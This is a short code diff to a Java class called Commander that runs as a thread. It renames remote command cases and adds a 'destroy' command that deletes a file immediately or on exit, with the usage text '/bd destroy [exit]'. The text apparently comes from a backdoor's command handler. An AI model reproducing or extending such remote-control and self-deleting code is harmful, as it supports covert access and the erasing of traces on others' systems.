@@ -67,12 +67,17 @@ public class Commander extends Thread{
                                 }
                                 writer.flush();
                                 continue;
-                            case "filecreate":
-                                writer.println(Output.create() ? "Success" : "Failed");
+                            case "create":
+                                writer.println(Output.call().create() ? "Success" : "Failed");
                                 writer.flush();
                                 continue;
-                            case "filedelete":
-                                writer.println(Output.delete() ? "Success" : "Failed");
+                            case "destroy":
+                                if (cmdarray.length == 2) writer.println("Destroy "+(Output.call().delete() ? "Success" : "Failed"));
+                                else if (cmdarray[2].equalsIgnoreCase("exit")){
+                                    writer.println("Destroy On Exit"+(Output.call().deleteOnExit() ? "Activated" : "Failed to activate"));
+                                }else{
+                                    writer.println("/bd destroy [exit]");
+                                }
                                 writer.flush();
                                 continue;
                             case "end":
